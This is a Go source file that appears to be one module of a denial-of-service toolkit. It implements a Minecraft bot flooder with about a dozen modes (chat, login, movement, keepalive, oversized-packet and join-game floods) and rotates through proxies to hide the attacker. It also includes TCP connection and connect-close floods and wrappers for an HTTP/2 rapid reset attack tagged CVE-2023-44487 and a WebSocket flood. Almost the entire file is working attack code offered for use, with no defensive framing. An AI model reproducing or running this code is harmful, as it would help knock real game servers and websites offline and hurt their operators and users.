package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// ============================================================
// High-Performance Minecraft Bot System
// Layer 4 (TCP) + Layer 7 (Game Protocol) Attack Vectors
// ============================================================

// Minecraft protocol states (new constants not in slayer.go)
const (
	mcStateHandshaking = 0
	mcStateStatus      = 1
	mcStateLogin       = 2
	mcStatePlay        = 3
)

// Additional Minecraft packet IDs (1.20.1+) not already defined in slayer.go
const (
	packetLoginDisconnect   = 0x00
	packetLoginSuccess      = 0x01
	packetLoginCompression  = 0x02
	packetLoginPluginRequest = 0x03
	packetPlaySpawnObject   = 0x00
	packetPlayPlayerAbilities = 0x37
	packetPlayPlayerPosition  = 0x39
	packetPlayPlayerRotation  = 0x3A
	packetPlayChatCommand2    = 0x3C // Different from slayer.go's 0x04 (1.20.1+)
	packetPlayChatAck2        = 0x3D
	packetPlayChatPreview2    = 0x3E
	packetPlayChatMessage2    = 0x3F
	packetPlayUseItem         = 0x37
	packetPlayChangeSign      = 0x46
	packetPlayArmAnimation    = 0x47
	packetPlayContainerConfirm2 = 0x45
	packetPlayContainerClick2   = 0x43
	packetPlayKeepalive2      = 0x4C
)

// MCPacketBuffer is a reusable buffer for packet encoding
type MCPacketBuffer struct {
	buf bytes.Buffer
}

func (p *MCPacketBuffer) Reset() {
	p.buf.Reset()
}

func (p *MCPacketBuffer) WriteVarInt(v int) {
	for {
		if (v & ^0x7F) == 0 {
			p.buf.WriteByte(byte(v))
			return
		}
		p.buf.WriteByte(byte((v & 0x7F) | 0x80))
		v >>= 7
	}
}

func (p *MCPacketBuffer) WriteVarLong(v int64) {
	for {
		if (v & ^0x7F) == 0 {
			p.buf.WriteByte(byte(v))
			return
		}
		p.buf.WriteByte(byte((v & 0x7F) | 0x80))
		v >>= 7
	}
}

func (p *MCPacketBuffer) WriteString(s string) {
	p.WriteVarInt(len(s))
	p.buf.WriteString(s)
}

func (p *MCPacketBuffer) WriteUShort(v uint16) {
	binary.Write(&p.buf, binary.BigEndian, v)
}

func (p *MCPacketBuffer) WriteInt(v int) {
	binary.Write(&p.buf, binary.BigEndian, uint32(v))
}

func (p *MCPacketBuffer) WriteLong(v int64) {
	binary.Write(&p.buf, binary.BigEndian, uint64(v))
}

func (p *MCPacketBuffer) WriteByte(b byte) {
	p.buf.WriteByte(b)
}

func (p *MCPacketBuffer) WriteDouble(v float64) {
	binary.Write(&p.buf, binary.BigEndian, v)
}

func (p *MCPacketBuffer) WriteFloat(v float32) {
	binary.Write(&p.buf, binary.BigEndian, v)
}

func (p *MCPacketBuffer) WriteBool(v bool) {
	if v {
		p.buf.WriteByte(1)
	} else {
		p.buf.WriteByte(0)
	}
}

func (p *MCPacketBuffer) WriteShort(v int16) {
	binary.Write(&p.buf, binary.BigEndian, v)
}

func (p *MCPacketBuffer) Bytes() []byte {
	return p.buf.Bytes()
}

func (p *MCPacketBuffer) Len() int {
	return p.buf.Len()
}

// ReadVarIntFromReader reads a VarInt from the reader
func ReadVarIntFromReader(r *bufio.Reader) (int, error) {
	result := 0
	count := 0
	for {
		b, err := r.ReadByte()
		if err != nil {
			return 0, err
		}
		count++
		result |= int(b&0x7F) << (7 * (count - 1))
		if (b & 0x80) == 0 {
			break
		}
		if count > 5 {
			return 0, fmt.Errorf("varint too big")
		}
	}
	return result, nil
}

// ========================
// Minecraft Bot System
// ========================

// MCBotConfig holds configuration for a Minecraft bot
type MCBotConfig struct {
	Host         string
	Port         int
	ProtocolVer  int
	Username     string
	UUID         string
	ConnectCount int
	Delay        time.Duration
	UseProxy     bool
	ProxyHost    string
	ProxyUser    string
	ProxyPass    string
}

// MCBot represents a single Minecraft bot instance
type MCBot struct {
	config   MCBotConfig
	conn     net.Conn
	reader   *bufio.Reader
	writer   *bufio.Writer
	packets  *MCPacketBuffer
	state    int
	botID    int64
}

// NewMCBot creates a new Minecraft bot instance
func NewMCBot(id int64, config MCBotConfig) *MCBot {
	return &MCBot{
		config:  config,
		state:   mcStateHandshaking,
		packets: &MCPacketBuffer{},
		botID:   id,
	}
}

// connect establishes a TCP connection to the Minecraft server
func (b *MCBot) connect() error {
	target := fmt.Sprintf("%s:%d", b.config.Host, b.config.Port)

	if b.config.UseProxy {
		conn, err := net.DialTimeout("tcp", b.config.ProxyHost, dialTimeout)
		if err != nil {
			return fmt.Errorf("proxy dial failed: %w", err)
		}

		// Send CONNECT request
		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", target, target)
		if b.config.ProxyUser != "" {
			cred := encodeBase64Simple(b.config.ProxyUser + ":" + b.config.ProxyPass)
			connectReq += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", cred)
		}
		connectReq += "\r\n"

		if _, err := conn.Write([]byte(connectReq)); err != nil {
			conn.Close()
			return fmt.Errorf("proxy CONNECT write failed: %w", err)
		}

		br := bufio.NewReader(conn)
		resp, err := readHTTPResponse(br)
		if err != nil || resp.StatusCode != 200 {
			conn.Close()
			return fmt.Errorf("proxy CONNECT failed: %v", resp)
		}
		resp.Body.Close()
		b.conn = conn
	} else {
		conn, err := net.DialTimeout("tcp", target, dialTimeout)
		if err != nil {
			return fmt.Errorf("direct dial failed: %w", err)
		}
		b.conn = conn
	}

	b.conn.SetDeadline(time.Now().Add(30 * time.Second))
	b.reader = bufio.NewReaderSize(b.conn, 1024*1024)
	b.writer = bufio.NewWriter(b.conn)

	return nil
}

// sendPacket encodes and sends a Minecraft packet with length prefix
func (b *MCBot) sendPacket(packetID int, data []byte) error {
	b.packets.Reset()
	b.packets.WriteVarInt(len(data) + 1) // length = data + 1 byte for packet ID
	b.packets.WriteVarInt(packetID)
	if len(data) > 0 {
		b.packets.buf.Write(data)
	}

	b.conn.SetDeadline(time.Now().Add(10 * time.Second))
	_, err := b.conn.Write(b.packets.Bytes())
	b.conn.SetDeadline(time.Time{})
	if err != nil {
		mcErrors.Add(1)
		return err
	}
	mcPacketsSent.Add(1)
	return nil
}

// doHandshake sends the Minecraft handshake packet
func (b *MCBot) doHandshake(nextState int) error {
	b.packets.Reset()
	b.packets.WriteVarInt(b.config.ProtocolVer)
	b.packets.WriteString(b.config.Host)
	b.packets.WriteUShort(uint16(b.config.Port))
	b.packets.WriteVarInt(nextState)
	return b.sendPacket(0x00, b.packets.Bytes())
}

// doLoginStart sends the login start packet
func (b *MCBot) doLoginStart() error {
	b.packets.Reset()
	b.packets.WriteString(b.config.Username)
	b.packets.WriteVarInt(0) // Timestamp
	return b.sendPacket(packetLoginStart, b.packets.Bytes())
}

// doChatMessage sends a chat message
func (b *MCBot) doChatMessage(msg string) error {
	b.packets.Reset()
	b.packets.WriteString(msg)
	b.packets.WriteVarInt(0)
	b.packets.WriteLong(time.Now().UnixMilli())
	return b.sendPacket(packetPlayChat, b.packets.Bytes())
}

// doKeepAlive sends a keepalive response
func (b *MCBot) doKeepAlive(payload int64) error {
	b.packets.Reset()
	b.packets.WriteLong(payload)
	return b.sendPacket(packetPlayKeepAlive, b.packets.Bytes())
}

// doPlayerAction sends player action packets
func (b *MCBot) doPlayerAction(action, hand, face, direction int) error {
	b.packets.Reset()
	b.packets.WriteVarInt(action)
	b.packets.WriteVarInt(0)
	b.packets.WriteVarInt(hand)
	b.packets.WriteVarInt(face)
	b.packets.WriteVarInt(direction)
	return b.sendPacket(packetPlayPlayerAction, b.packets.Bytes())
}

// doPlayerPosition sends position packets (movement spam)
func (b *MCBot) doPlayerPosition(x, y, z float64, onGround bool) error {
	b.packets.Reset()
	b.packets.WriteDouble(x)
	b.packets.WriteDouble(y)
	b.packets.WriteDouble(z)
	b.packets.WriteDouble(0)
	b.packets.WriteDouble(0)
	b.packets.WriteBool(onGround)
	return b.sendPacket(packetPlayPlayerPosition, b.packets.Bytes())
}

// doPlayerRotation sends rotation packets
func (b *MCBot) doPlayerRotation(yaw, pitch float32, onGround bool) error {
	b.packets.Reset()
	b.packets.WriteFloat(yaw)
	b.packets.WriteFloat(pitch)
	b.packets.WriteBool(onGround)
	return b.sendPacket(packetPlayPlayerRotation, b.packets.Bytes())
}

// doArmAnimation sends arm swing packets
func (b *MCBot) doArmAnimation(hand int) error {
	b.packets.Reset()
	b.packets.WriteVarInt(hand)
	return b.sendPacket(packetPlayArmAnimation, b.packets.Bytes())
}

// doContainerClick sends container click packets
func (b *MCBot) doContainerClick(windowID, slot, button, mode int) error {
	b.packets.Reset()
	b.packets.WriteByte(byte(windowID))
	b.packets.WriteShort(int16(slot))
	b.packets.WriteByte(byte(button))
	b.packets.WriteShort(int16(mode))
	return b.sendPacket(packetPlayContainerClick, b.packets.Bytes())
}

// doContainerConfirm sends container confirm packet
func (b *MCBot) doContainerConfirm(id int) error {
	b.packets.Reset()
	b.packets.WriteVarInt(id)
	return b.sendPacket(packetPlayContainerConfirm, b.packets.Bytes())
}

// encodeBase64Simple encodes a string to base64
func encodeBase64Simple(s string) string {
	return base64Encode([]byte(s))
}

// base64Encode encodes bytes to base64 string (simplified standard encoding)
func base64Encode(data []byte) string {
	encoding := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	var result []byte
	for i := 0; i < len(data); i += 3 {
		var b [3]byte
		b[0] = data[i]
		if i+1 < len(data) {
			b[1] = data[i+1]
		}
		if i+2 < len(data) {
			b[2] = data[i+2]
		}
		combined := uint32(b[0])<<16 | uint32(b[1])<<8 | uint32(b[2])
		result = append(result, encoding[(combined>>18)&0x3F])
		result = append(result, encoding[(combined>>12)&0x3F])
		if i+1 < len(data) {
			result = append(result, encoding[(combined>>6)&0x3F])
		} else {
			result = append(result, '=')
		}
		if i+2 < len(data) {
			result = append(result, encoding[combined&0x3F])
		} else {
			result = append(result, '=')
		}
	}
	return string(result)
}

// readHTTPResponse reads an HTTP response from a bufio reader
func readHTTPResponse(r *bufio.Reader) (*httpResponse, error) {
	line, err := r.ReadString('\n')
	if err != nil {
		return nil, err
	}
	parts := strings.Split(strings.TrimSpace(line), " ")
	if len(parts) < 2 {
		return nil, fmt.Errorf("invalid HTTP response: %s", line)
	}
	statusCode, _ := strconv.Atoi(parts[1])
	resp := &httpResponse{
		StatusCode: statusCode,
		Header:     make(http.Header),
	}
	for {
		line, err = r.ReadString('\n')
		if err != nil {
			return nil, err
		}
		if strings.TrimSpace(line) == "" {
			break
		}
	}
	resp.Body = io.NopCloser(r)
	return resp, nil
}

type httpResponse struct {
	StatusCode int
	Header     http.Header
	Body       io.ReadCloser
}

// ========================
// Bot Runner & Manager
// ========================

// BotStats tracks live bot statistics
type BotStats struct {
	Connected   atomic.Int64
	Failed      atomic.Int64
	PacketsSent atomic.Int64
	Errors      atomic.Int64
}

// BotStatsSnapshot is a snapshot of bot stats
type BotStatsSnapshot struct {
	Connected   int64
	Failed      int64
	PacketsSent int64
	Errors      int64
}

// MCBotRunner runs high-frequency Minecraft bot attacks
type MCBotRunner struct {
	config MCBotConfig
	stop   chan struct{}
	stats  *BotStats
}

func NewMCBotRunner(config MCBotConfig, stats *BotStats) *MCBotRunner {
	return &MCBotRunner{
		config: config,
		stop:   make(chan struct{}),
		stats:  stats,
	}
}

// runSingleBot performs a single connection cycle
func (r *MCBotRunner) runSingleBot(workerID int, method string) {
	bot := NewMCBot(int64(workerID), r.config)

	for {
		select {
		case <-r.stop:
			return
		default:
		}

		if err := bot.connect(); err != nil {
			r.stats.Failed.Add(1)
			mcBotsFailed.Add(1)
			continue
		}
		mcBotsConnected.Add(1)
		r.stats.Connected.Add(1)

		switch strings.ToLower(method) {
		case "mc-status-flood":
			if err := bot.doHandshake(mcStateStatus); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.sendPacket(packetStatusRequest, nil); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 50; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				if err := bot.sendPacket(packetStatusPing, nil); err != nil {
					bot.conn.Close()
					break
				}
			}
			bot.conn.Close()

		case "mc-handshake-flood":
			for i := 0; i < 100; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				if err := bot.doHandshake(mcStateLogin); err != nil {
					bot.conn.Close()
					break
				}
			}
			bot.conn.Close()

		case "mc-login-flood":
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			bot.conn.Close()

		case "mc-chat-flood":
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 10; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				chatMsg := fmt.Sprintf("msg_%d", int(rd.Int63n(9999999)))
				if err := bot.doChatMessage(chatMsg); err != nil {
					bot.conn.Close()
					break
				}
			}
			bot.conn.Close()

		case "mc-keepalive-flood":
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 100; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				if err := bot.doKeepAlive(int64(rd.Int63n(999999))); err != nil {
					bot.conn.Close()
					break
				}
			}
			bot.conn.Close()

		case "mc-movement-flood":
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 200; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				randomX := float64(rd.Int63n(100000))
				randomY := float64(rd.Int63n(100000))
				randomZ := float64(rd.Int63n(100000))
				if err := bot.doPlayerPosition(randomX, randomY, randomZ, true); err != nil {
					bot.conn.Close()
					break
				}
			}
			bot.conn.Close()

		case "mc-action-flood":
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 150; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				if err := bot.doPlayerAction(0, 0, 0, 0); err != nil {
					bot.conn.Close()
					break
				}
				if err := bot.doArmAnimation(0); err != nil {
					bot.conn.Close()
					break
				}
			}
			bot.conn.Close()

		case "mc-container-flood":
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 100; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				if err := bot.doContainerClick(0, i%9, 0, 0); err != nil {
					bot.conn.Close()
					break
				}
				if err := bot.doContainerConfirm(i%9); err != nil {
					bot.conn.Close()
					break
				}
			}
			bot.conn.Close()

		case "mc-full-spam":
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 500; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				switch i % 5 {
				case 0:
					bot.doChatMessage(fmt.Sprintf("spam_%d", i))
				case 1:
					bot.doKeepAlive(int64(rd.Int63n(999999)))
				case 2:
					bot.doPlayerPosition(float64(rd.Int63n(100000)), float64(rd.Int63n(100000)), float64(rd.Int63n(100000)), true)
				case 3:
					bot.doPlayerAction(0, 0, 0, 0)
				case 4:
					bot.doArmAnimation(0)
				}
			}
			bot.conn.Close()

		case "mc-compression-flood":
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 5; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				largeMsg := strings.Repeat("A", 1024*512)
				if err := bot.sendPacket(packetPlayChat, []byte(largeMsg)); err != nil {
					bot.conn.Close()
					break
				}
			}
			bot.conn.Close()

		case "mc-joingame-flood":
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 100; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				bot.packets.Reset()
				bot.packets.WriteVarInt(i)
				bot.packets.WriteVarInt(1)
				bot.packets.WriteString("minecraft:overworld")
				bot.packets.WriteString("minecraft:overworld")
				bot.packets.WriteByte(0)
				if err := bot.sendPacket(packetPlaySimple, bot.packets.Bytes()); err != nil {
					bot.conn.Close()
					break
				}
			}
			bot.conn.Close()

		default:
			if err := bot.doHandshake(mcStateLogin); err != nil {
				bot.conn.Close()
				continue
			}
			if err := bot.doLoginStart(); err != nil {
				bot.conn.Close()
				continue
			}
			for i := 0; i < 100; i++ {
				select {
				case <-r.stop:
					bot.conn.Close()
					return
				default:
				}
				bot.doKeepAlive(int64(rd.Int63n(999999)))
			}
			bot.conn.Close()
		}

		if r.config.Delay > 0 {
			select {
			case <-r.stop:
				return
			case <-time.After(r.config.Delay):
			}
		}
	}
}

func (r *MCBotRunner) Stop() {
	close(r.stop)
}

// MCBotWorkerManager manages a pool of Minecraft bot workers
type MCBotWorkerManager struct {
	config     MCBotConfig
	workers    int
	stop       chan struct{}
	stats      *BotStats
	botRunners []*MCBotRunner
}

func NewMCBotWorkerManager(config MCBotConfig, workers int) *MCBotWorkerManager {
	return &MCBotWorkerManager{
		config:  config,
		workers: workers,
		stop:    make(chan struct{}),
		stats:   &BotStats{},
	}
}

func (m *MCBotWorkerManager) Start(method string) {
	for i := 0; i < m.workers; i++ {
		runner := NewMCBotRunner(m.config, m.stats)
		m.botRunners = append(m.botRunners, runner)
		go runner.runSingleBot(i, method)
	}
}

func (m *MCBotWorkerManager) StopAll() {
	close(m.stop)
	for _, runner := range m.botRunners {
		runner.Stop()
	}
}

func (m *MCBotWorkerManager) GetStats() BotStatsSnapshot {
	return BotStatsSnapshot{
		Connected:   m.stats.Connected.Load(),
		Failed:      m.stats.Failed.Load(),
		PacketsSent: m.stats.PacketsSent.Load(),
		Errors:      m.stats.Errors.Load(),
	}
}

// ========================
// Layer 4 Flood Methods
// ========================

// TCPConnectionFlood performs a high-rate TCP connection flood
func TCPConnectionFlood(host string, port int, workers int, duration int, stop <-chan struct{}, verbose bool) {
	target := fmt.Sprintf("%s:%d", host, port)
	for i := 0; i < workers; i++ {
		go func(workerID int) {
			for {
				select {
				case <-stop:
					return
				default:
				}
				var conn net.Conn
				var err error
				if len(proxyList) > 0 {
					proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
					pURL, _ := url.Parse(proxy)
					if pURL != nil {
						conn, err = net.DialTimeout("tcp", pURL.Host, dialTimeout)
						if err != nil {
							continue
						}
						connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
						conn.Write([]byte(connectReq))
						br := bufio.NewReader(conn)
						resp, _ := readHTTPResponse(br)
						if resp != nil {
							resp.Body.Close()
						}
						conn.SetDeadline(time.Now().Add(5 * time.Second))
						conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n"))
						conn.SetDeadline(time.Time{})
					}
				} else {
					conn, err = net.DialTimeout("tcp", target, dialTimeout)
					if err == nil {
						conn.SetDeadline(time.Now().Add(5 * time.Second))
						conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n"))
						conn.SetDeadline(time.Time{})
					}
				}
				if err != nil {
					if verbose {
						log.Printf("[tcp-flood-%d] %v", workerID, err)
					}
					continue
				}
				totalSent.Add(1)
				conn.Close()
			}
		}(i)
	}
}

// SYNFlood simulates a SYN flood using rapid TCP connect+close
func SYNFlood(host string, port int, workers int, duration int, stop <-chan struct{}, verbose bool) {
	target := fmt.Sprintf("%s:%d", host, port)
	for i := 0; i < workers; i++ {
		go func(workerID int) {
			for {
				select {
				case <-stop:
					return
				default:
				}
				conn, err := net.DialTimeout("tcp", target, dialTimeout)
				if err != nil {
					if verbose {
						log.Printf("[syn-flood-%d] %v", workerID, err)
					}
					continue
				}
				conn.Close()
				totalSent.Add(1)
			}
		}(i)
	}
}

// HTTP2RapidResetAttack performs HTTP/2 rapid reset attack (CVE-2023-44487)
func HTTP2RapidResetAttack(targetURL string, workers int, duration int, stop <-chan struct{}) {
	for i := 0; i < workers; i++ {
		go func(workerID int) {
			httpRapidReset(targetURL, stop)
		}(i)
	}
}

// WebSocketFlood performs WebSocket message flooding
func WebSocketFlood(targetURL string, workers int, duration int, stop <-chan struct{}) {
	for i := 0; i < workers; i++ {
		go func(workerID int) {
			wsFlood(targetURL, stop)
		}(i)
	}
}

// ========================
// CLI Integration
// ========================

// RunMCBotAttack runs a Minecraft bot attack with the given parameters
func RunMCBotAttack(target string, method string, workers int, duration int, proxies []string, verbose bool) {
	host := extractHostFromTarget(target)
	port := extractPortFromTarget(target, 25565)

	config := MCBotConfig{
		Host:        host,
		Port:        port,
		ProtocolVer: 763, // 1.20.1
		ConnectCount: workers,
		Delay:       0,
	}

	config.Username = "Bot_" + generateRandomString(8)
	config.UUID = fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		rd.Int63n(0xffffffff), rd.Int63n(0xffff),
		rd.Int63n(0xffff), rd.Int63n(0xffff), rd.Int63n(0xffffffffffff))

	useProxy := len(proxies) > 0
	if useProxy {
		proxyIdx := int(rd.Int63n(int64(len(proxies))))
		proxyURL, _ := url.Parse(proxies[proxyIdx])
		if proxyURL != nil {
			config.UseProxy = true
			config.ProxyHost = proxyURL.Host
			if proxyURL.User != nil {
				config.ProxyUser = proxyURL.User.Username()
				config.ProxyPass, _ = proxyURL.User.Password()
			}
		}
	}

	// Normalize method name: convert "mc-login" → "mc-login-flood" for internal routing
	normMethod := strings.ToLower(method)
	if strings.HasPrefix(normMethod, "mc-") && !strings.HasSuffix(normMethod, "-flood") && normMethod != "mc-full-spam" {
		normMethod = normMethod + "-flood"
	}

	manager := NewMCBotWorkerManager(config, workers)
	manager.Start(normMethod)

	time.Sleep(time.Duration(duration) * time.Second)
	manager.StopAll()

	log.Printf("[mc-bot] Attack complete - Connected: %d, Failed: %d, Packets: %d, Errors: %d\n",
		manager.stats.Connected.Load(), manager.stats.Failed.Load(),
		manager.stats.PacketsSent.Load(), manager.stats.Errors.Load())
}

// ========================
// Global MC stats
// ========================

var (
	mcBotsConnected atomic.Int64
	mcBotsFailed    atomic.Int64
	mcPacketsSent   atomic.Int64
	mcErrors        atomic.Int64
)
